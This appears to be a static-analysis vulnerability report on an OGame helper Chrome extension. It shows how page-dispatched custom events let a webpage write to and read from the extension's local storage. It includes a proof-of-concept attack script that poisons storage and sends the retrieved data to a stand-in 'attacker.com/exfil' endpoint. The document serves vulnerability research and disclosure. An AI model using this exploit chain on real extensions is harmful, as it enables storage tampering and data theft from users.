# CoCo Analysis: nhbgpipnadhelnecpcjcikbnedilhddf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_UIPPSaveData → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nhbgpipnadhelnecpcjcikbnedilhddf/opgen_generated_files/cs_0.js
Line 685-692: UIPPSaveData event listener stores attacker-controlled data to chrome.storage.local

**Code:**

```javascript
// Content script - loader.js
// WRITE PATH: Attacker can poison storage
document.addEventListener('UIPPSaveData', function (evt) {
  var parsedDetail = JSON.parse(evt.detail); // ← attacker-controlled
  var toStore = {};
  toStore[parsedDetail.key] = parsedDetail.value; // ← attacker controls both key and value
  chrome.storage.local.set(toStore).then(() => {
    console.log('OGame UI++: saved data', parsedDetail.key);
  });
});

// READ PATH: Attacker can retrieve stored data
document.addEventListener('UIPPGetData', function (evt) {
  var keys = (evt.detail || '').split(','); // ← attacker specifies which keys to read
  var start = Date.now();
  chrome.storage.local.get(keys).then((result) => {
    console.log('OGame UI++: loaded data in', Date.now() - start, 'ms.\n  - ' + keys.join('\n  - '));
    var evt = document.createEvent('CustomEvent');
    evt.initCustomEvent('UIPPGetDataResponse:' + keys.join(','), true, true, JSON.stringify(result));
    document.dispatchEvent(evt); // ← Sends storage data back to webpage via event
  });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom events (UIPPSaveData and UIPPGetData)

**Attack:**

```javascript
// On an OGame webpage (*.ogame.gameforge.com/game/*):

// Step 1: Poison storage with malicious data
const saveEvent = document.createEvent('CustomEvent');
saveEvent.initCustomEvent('UIPPSaveData', true, true, JSON.stringify({
  key: 'maliciousData',
  value: 'attacker-controlled-payload'
}));
document.dispatchEvent(saveEvent);

// Step 2: Retrieve the poisoned data (or any other stored data)
document.addEventListener('UIPPGetDataResponse:maliciousData', function(evt) {
  const storedData = JSON.parse(evt.detail);
  console.log('Exfiltrated data:', storedData);
  // Attacker can now send this to their server
  fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify(storedData)
  });
});

const getEvent = document.createEvent('CustomEvent');
getEvent.initCustomEvent('UIPPGetData', true, true, 'maliciousData');
document.dispatchEvent(getEvent);
```

**Impact:** Complete storage exploitation chain. An attacker controlling an OGame webpage can both write arbitrary data to the extension's storage (storage poisoning) and read it back through the response event. This allows the attacker to store malicious data and retrieve sensitive information that the extension stores, including user preferences, game state, or any other data the extension persists.
